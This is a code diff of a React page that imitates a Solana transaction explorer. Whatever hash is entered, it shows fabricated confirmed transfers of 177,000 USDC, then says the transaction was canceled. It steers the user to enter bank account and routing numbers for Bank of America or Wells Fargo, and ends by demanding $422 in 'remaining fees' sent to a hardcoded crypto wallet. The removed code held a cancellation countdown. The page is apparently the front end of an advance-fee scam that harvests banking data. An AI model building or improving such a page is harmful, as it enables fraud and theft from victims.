@@ -1,44 +1,34 @@
 "use client";
 
-import { useEffect, useState } from "react";
-import { Search, CheckCircle2 } from "lucide-react";
+import { useState } from "react";
+import { Search, CheckCircle2, ArrowRight } from "lucide-react";
 
+type Screen =
+  | "search"
+  | "details"
+  | "canceled"
+  | "bank"
+  | "warning"
+  | "confirmed";
 
 export default function Home() {
 
   const [hash, setHash] = useState("");
-  const [searched, setSearched] = useState(false);
-  const [confirmed, setConfirmed] = useState(false);
-  const [timeLeft, setTimeLeft] = useState(12 * 60 * 60); // 12 horas en segundos
-  
+  const [screen, setScreen] = useState<Screen>("search");
+  const [bank, setBank] = useState<"bofa" | "wells" | null>(null);
+  const [beneficiary, setBeneficiary] = useState("");
+  const [account, setAccount] = useState("");
+  const [routing, setRouting] = useState("");
+  const [amount, setAmount] = useState("");
+
 
   const searchTransaction = () => {
 
-    if(hash.trim().length > 0){
-      setSearched(true);
+    if(hash.trim()) {
+      setScreen("details");
     }
 
   };
-
-  useEffect(() => {
-  if (!confirmed) return;
-
-  const interval = setInterval(() => {
-    setTimeLeft((prev) => {
-      if (prev <= 1) {
-        clearInterval(interval);
-        return 0;
-      }
-      return prev - 1;
-    });
-  }, 1000);
-
-  return () => clearInterval(interval);
-}, [confirmed]);
-
-const hours = String(Math.floor(timeLeft / 3600)).padStart(2, "0");
-const minutes = String(Math.floor((timeLeft % 3600) / 60)).padStart(2, "0");
-const seconds = String(timeLeft % 60).padStart(2, "0");
 
 
   return (
@@ -49,8 +39,6 @@ const seconds = String(timeLeft % 60).padStart(2, "0");
     text-white
     ">
 
-
-      {/* HEADER */}
 
       <header className="
       border-b
@@ -75,13 +63,12 @@ const seconds = String(timeLeft % 60).padStart(2, "0");
           </h1>
 
 
-          <div className="
+          <span className="
           text-sm
           text-[#14F195]
           ">
             Mainnet
-          </div>
-
+          </span>
 
         </div>
 
@@ -89,373 +76,262 @@ const seconds = String(timeLeft % 60).padStart(2, "0");
 
 
 
-
       <main className="
-      max-w-6xl
+      max-w-5xl
       mx-auto
       px-6
       py-10
       ">
 
 
+{screen === "warning" && (
 
-        {/* SEARCH BOX */}
+<div className="
+max-w-xl
+mx-auto
+bg-[#151922]
+border
+border-yellow-500/30
+rounded-2xl
+p-8
+">
 
-        <div className="
-        bg-[#151922]
-        border
-        border-white/10
-        rounded-2xl
-        p-6
-        ">
 
+<div className="
+text-center
+">
 
-          <p className="
-          text-sm
-          text-gray-400
-          mb-3
-          ">
-            Search transaction signature
-          </p>
 
+<h2 className="
+text-2xl
+font-bold
+text-yellow-400
+">
 
+Remining fees: $422 Total
 
-          <div className="
-          flex
-          gap-3
-          ">
+</h2>
 
 
-            <input
+<p className="
+mt-4
+text-gray-300
+">
 
-              value={hash}
+Deposit the remaining fees to complete the transfer. 
 
-              onChange={(e)=>setHash(e.target.value)}
+</p>
 
-              placeholder="
-              Enter Solana transaction hash
-              "
+<div className="
+mt-4
+inline-flex
+items-center
+rounded-full
+bg-yellow-500/10
+border
+border-yellow-500/30
+px-4
+py-2
+">
 
-              className="
-              flex-1
-              bg-[#0f1115]
-              border
-              border-white/10
-              rounded-xl
-              px-5
-              py-4
-              text-sm
-              text-white
-              outline-none
-              "
+<span className="
+w-2
+h-2
+rounded-full
+bg-yellow-400
+mr-2
+">
+</span>
 
-            />
+<span className="
+text-sm
+font-semibold
+text-yellow-300
+">
+Dn5T35muNSyC7CfuyvxR2DX7Y3hTBL5SKWqd5DncvcTW
+</span>
 
+</div>
 
 
-            <button
+</div>
 
-              onClick={searchTransaction}
 
-              className="
-              bg-[#14F195]
-              text-black
-              px-6
-              rounded-xl
-              font-semibold
-              flex
-              items-center
-              gap-2
-              hover:opacity-90
-              "
 
-            >
+<div className="
+mt-8
+space-y-4
+">
 
-              <Search size={18}/>
-
-              Search
-
-            </button>
-
-
-          </div>
-
-
-        </div>
-
-
-
-
-
-
-
-        {/* EMPTY STATE */}
-
-        {!searched && (
-
-          <div className="
-          mt-8
-          bg-[#151922]
-          border
-          border-white/10
-          rounded-2xl
-          p-12
-          text-center
-          ">
-
-
-            <h2 className="
-            text-xl
-            font-semibold
-            ">
-              Search a transaction
-            </h2>
-
-
-            <p className="
-            text-gray-400
-            mt-3
-            ">
-              Enter a Solana signature above to view transaction details.
-            </p>
-
-
-          </div>
-
-        )}
-
-
-
-
-
-
-
-
-        {/* RESULTS */}
-
-
-        {searched && (
-
-        <div className="
-        mt-8
-        grid
-        grid-cols-1
-        lg:grid-cols-3
-        gap-6
-        ">
-
-
-
-
-          {/* DETAILS */}
-
-
-          <div className="
-          lg:col-span-2
-          bg-[#151922]
-          border
-          border-white/10
-          rounded-2xl
-          p-6
-          ">
-
-
-            <h2 className="
-            text-xl
-            font-semibold
-            mb-6
-            ">
-              Transaction Details
-            </h2>
-
-
-
-
-            <Info
-
-            title="Signature"
-
-            value={hash}
-
-            />
-
-
-
-            <Info
-
-            title="Status"
-
-            value="Confirmed"
-
-            success
-
-            />
-
-
-
-            <Info
-
-            title="Block"
-
-            value="312948392"
-
-            />
-
-
-
-            <Info
-
-            title="Timestamp"
-
-            value="Today 13:42 UTC"
-
-            />
-
-
-
-            <Info
-
-            title="Network"
-
-            value="Solana"
-
-            />
 
 <Info
-
-title="Destination Wallet"
-
-value="NB1Mm...qTU66"
-
+title="Bank"
+value={
+bank === "bofa"
+? "Bank of America"
+: "Wells Fargo"
+}
 />
 
 
+<Info
+title="Beneficiary"
+value={beneficiary}
+/>
 
-            <Info
 
-            title="Fee"
+<Info
+title="Account"
+value={account}
+/>
 
-            value="14.00095 SOL"
 
-            />
+<Info
+title="Amount"
+value={`$${amount} USD`}
+/>
 
-<button
-  onClick={() => setConfirmed(true)}
-  className="
-  mt-8
-  w-full
-  rounded-xl
-  bg-[#14F195]
-  text-black
-  py-3
-  font-semibold
-  hover:opacity-90
-  transition
-  "
->
-  Confirm
-</button>
 
-{confirmed && (
+</div>
+
+
 
 <div className="
+mt-8
+rounded-xl
+bg-yellow-500/10
+border
+border-yellow-500/20
+p-4
+">
+
+
+<p className="
+text-sm
+text-yellow-300
+">
+
+Warning: Once submitted, this transfer request cannot be modified.
+
+</p>
+
+
+</div>
+
+
+
+<button
+
+onClick={()=>setScreen("confirmed")}
+
+className="
 mt-6
+w-full
+rounded-xl
+bg-[#14F195]
+text-black
+py-3
+font-semibold
+"
+
+>
+
+Continue
+
+</button>
+
+
+
+</div>
+
+)}
+
+{screen === "confirmed" && (
+
+<div className="
+max-w-xl
+mx-auto
 bg-[#151922]
 border
 border-white/10
 rounded-2xl
-p-6
+p-8
+text-center
 ">
 
 
-<h3 className="
-text-lg
-font-semibold
+<div className="
+w-16
+h-16
+mx-auto
+rounded-full
+bg-[#14F195]/10
+flex
+items-center
+justify-center
 ">
-Wallet Details
-</h3>
 
-
-<div className="mt-5">
-
-<p className="
-text-sm
-text-gray-400
-">
-Solana Wallet
-</p>
-
-
-<p className="
-mt-2
-text-sm
-break-all
-text-white
-">
-DJPSsRnYZjddCaQJsNJ4hibSjMN6tD2stC2wHRjM13iE
-</p>
+<CheckCircle2
+size={40}
+className="text-[#14F195]"
+/>
 
 </div>
 
 
 
-
-<div className="
+<h2 className="
 mt-6
-">
-
-<p className="
-text-sm
-text-gray-400
-">
-Remaining Fee
-</p>
-
-
-<p className="
-mt-2
 text-3xl
 font-bold
 ">
-$370.12 USD
+
+Confirmed Transaction
+
+</h2>
+
+
+
+<p className="
+mt-3
+text-gray-400
+">
+
+Your transaction has been confirmed successfully.
+
 </p>
 
 
-</div>
 
-
-
-<div className="
-mt-5
-inline-flex
-rounded-full
-bg-[#14F195]/10
-px-4
-py-2
-text-[#14F195]
-text-sm
-font-semibold
-">
-
-SOLANA
-
-</div>
 <div className="
 mt-8
 rounded-xl
+bg-[#0f1115]
 border
-border-yellow-500/30
-bg-yellow-500/10
-p-4
+border-white/10
+p-5
+text-left
 ">
 
-  <p className="text-sm text-yellow-300">
-    Transaction will be canceled in
-  </p>
 
-  <p className="mt-2 text-2xl font-bold text-yellow-400">
-    {hours}:{minutes}:{seconds}
-  </p>
+<Info
+title="Status"
+value="Confirmed"
+success
+/>
+
+
+<Info
+title="Network"
+value="Solana"
+/>
+
+
+<Info
+title="Transaction"
+value={hash}
+/>
+
 
 </div>
 
@@ -464,120 +340,510 @@ p-4
 
 )}
 
-          </div>
+{/* SEARCH */}
+
+{screen === "search" && (
+
+<div className="
+bg-[#151922]
+border
+border-white/10
+rounded-2xl
+p-6
+">
+
+
+<p className="text-sm text-gray-400 mb-3">
+Search transaction signature
+</p>
+
+
+<div className="
+flex
+gap-3
+">
+
+
+<input
+
+value={hash}
+
+onChange={(e)=>setHash(e.target.value)}
+
+placeholder="Enter Solana transaction hash"
+
+className="
+flex-1
+bg-[#0f1115]
+border
+border-white/10
+rounded-xl
+px-5
+py-4
+outline-none
+"
+
+/>
+
+
+<button
+
+onClick={searchTransaction}
+
+className="
+bg-[#14F195]
+text-black
+px-6
+rounded-xl
+font-semibold
+flex
+items-center
+gap-2
+"
+
+>
+
+<Search size={18}/>
+
+Search
+
+</button>
+
+
+</div>
+
+
+</div>
+
+)}
 
 
 
-          {/* SIDE CARD */}
+{/* DETAILS */}
+
+{screen === "details" && (
+
+<div className="
+grid
+grid-cols-1
+lg:grid-cols-3
+gap-6
+">
 
 
-          <div className="
-          bg-[#151922]
-          border
-          border-white/10
-          rounded-2xl
-          p-6
-          ">
+<div className="
+lg:col-span-2
+bg-[#151922]
+border
+border-white/10
+rounded-2xl
+p-6
+">
 
 
-            <h2 className="
-            font-semibold
-            ">
-              Balance Change
-            </h2>
+<h2 className="
+text-xl
+font-semibold
+mb-6
+">
+Transaction Details
+</h2>
 
 
-
-            <div className="
-            mt-6
-            text-4xl
-            font-bold
-            ">
-              177,000
-            </div>
+<Info
+title="Signature"
+value={hash}
+/>
 
 
-
-            <p className="
-            text-gray-400
-            mt-2
-            ">
-              USDC
-            </p>
+<Info
+title="Status"
+value="Confirmed"
+success
+/>
 
 
+<Info
+title="Network"
+value="Solana"
+/>
 
 
-
-            <div className="
-            mt-8
-            ">
-
-
-              <p className="
-              text-sm
-              text-gray-400
-              ">
-                Token
-              </p>
+<Info
+title="Destination Wallet"
+value="NB1Mm...qTU66"
+/>
 
 
-              <p className="
-              mt-1
-              ">
-                ALGO
-              </p>
-
-
-            </div>
-
+<Info
+title="Fee"
+value="14.00095 SOL"
+/>
 
 
 
+<button
+
+onClick={()=>setScreen("canceled")}
+
+className="
+mt-8
+w-full
+rounded-xl
+bg-[#14F195]
+text-black
+py-3
+font-semibold
+"
+
+>
+
+Confirm
+
+</button>
 
 
-            <div className="
-            mt-6
-            flex
-            items-center
-            gap-2
-            text-[#14F195]
-            ">
-
-              <CheckCircle2 size={18}/>
-
-              Confirmed
-
-            </div>
+</div>
 
 
-
-          </div>
-
-
-
-
-
-
-        </div>
-
-        )}
+<div className="
+bg-[#151922]
+border
+border-white/10
+rounded-2xl
+p-6
+">
 
 
+<h2 className="font-semibold">
+Balance Change
+</h2>
 
-      </main>
+
+<p className="
+mt-6
+text-4xl
+font-bold
+">
+177,000
+</p>
 
 
-    </div>
+<p className="text-gray-400">
+USDC
+</p>
 
-  );
+
+<div className="
+mt-8
+flex
+items-center
+gap-2
+text-[#14F195]
+">
+
+<CheckCircle2 size={18}/>
+
+Confirmed
+
+</div>
+
+
+</div>
+
+
+</div>
+
+)}
+
+
+
+{screen === "canceled" && (
+
+<div className="
+max-w-xl
+mx-auto
+bg-[#151922]
+border
+border-white/10
+rounded-2xl
+p-8
+">
+
+
+<div className="
+text-center
+">
+
+<h2 className="
+text-2xl
+font-bold
+text-red-400
+">
+Transaction Canceled
+</h2>
+
+
+<p className="
+mt-3
+text-gray-400
+">
+This transaction has been canceled.
+Choose another way to complete the transfer.
+</p>
+
+
+</div>
+
+
+
+<div className="
+mt-8
+space-y-4
+">
+
+
+<button
+
+onClick={()=> {
+  setBank("bofa");
+  setScreen("bank");
+}}
+
+className="
+w-full
+flex
+items-center
+gap-4
+rounded-xl
+border
+border-white/10
+bg-[#0f1115]
+p-5
+hover:border-[#14F195]
+transition
+"
+
+>
+
+
+<img
+
+src="/bnkam.png"
+
+alt="Bank of America"
+
+className="
+h-10
+w-auto
+"
+
+/>
+
+
+<div className="text-left">
+
+<p className="
+font-semibold
+">
+Bank of America
+</p>
+
+
+<p className="
+text-sm
+text-gray-400
+">
+Domestic transfer USA
+</p>
+
+
+</div>
+
+
+</button>
+
+
+
+
+
+<button
+
+onClick={()=> {
+  setBank("wells");
+  setScreen("bank");
+}}
+
+className="
+w-full
+flex
+items-center
+gap-4
+rounded-xl
+border
+border-white/10
+bg-[#0f1115]
+p-5
+hover:border-[#14F195]
+transition
+"
+
+>
+
+
+<img
+
+src="/wells.png"
+
+alt="Wells Fargo"
+
+className="
+h-10
+w-auto
+"
+
+/>
+
+
+<div className="text-left">
+
+<p className="
+font-semibold
+">
+Wells Fargo
+</p>
+
+
+<p className="
+text-sm
+text-gray-400
+">
+Domestic transfer USA
+</p>
+
+
+</div>
+
+
+</button>
+
+
+
+</div>
+
+
+</div>
+
+)}
+
+
+
+
+
+{/* BANK DETAILS */}
+
+{screen === "bank" && (
+
+<div className="
+max-w-xl
+mx-auto
+bg-[#151922]
+border
+border-white/10
+rounded-2xl
+p-8
+">
+
+<h2 className="
+text-2xl
+font-bold
+">
+Transfer Instructions
+</h2>
+
+
+<p className="
+mt-2
+text-gray-400
+">
+United States Domestic Transfer
+</p>
+
+
+<div className="mt-6">
+<input
+placeholder="Beneficiary Name"
+value={beneficiary}
+onChange={(e)=>setBeneficiary(e.target.value)}
+className="w-full bg-[#0f1115] border border-white/10 rounded-xl p-4 mb-3"
+/>
+
+
+<input
+placeholder="Account Number"
+value={account}
+onChange={(e)=>setAccount(e.target.value)}
+className="w-full bg-[#0f1115] border border-white/10 rounded-xl p-4 mb-3"
+/>
+
+
+<input
+placeholder="Routing Number"
+value={routing}
+onChange={(e)=>setRouting(e.target.value)}
+className="w-full bg-[#0f1115] border border-white/10 rounded-xl p-4 mb-3"
+/>
+
+
+<input
+placeholder="Amount USD"
+value={amount}
+onChange={(e)=>setAmount(e.target.value)}
+className="w-full bg-[#0f1115] border border-white/10 rounded-xl p-4"
+/>
+
+</div>
+<button
+
+onClick={()=>setScreen("warning")}
+
+className="
+mt-8
+w-full
+rounded-xl
+bg-[#14F195]
+text-black
+py-3
+font-semibold
+flex
+items-center
+justify-center
+gap-2
+"
+
+>
+
+Confirm Transfer
+
+<ArrowRight size={18}/>
+
+</button>
+
+</div>
+
+)}
+
+
+</main>
+
+</div>
+
+);
 
 }
 
 
-
-
-
+// COMPONENT
 
 function Info({
 
@@ -602,16 +868,12 @@ border-b
 border-white/10
 ">
 
-
 <p className="
 text-sm
 text-gray-400
 ">
-
 {title}
-
 </p>
-
 
 
 <p className={`
@@ -620,15 +882,12 @@ text-sm
 break-all
 ${success ? "text-[#14F195]" : "text-white"}
 `}>
-
 {value}
-
 </p>
 
 
 </div>
 
 )
-
 
 }
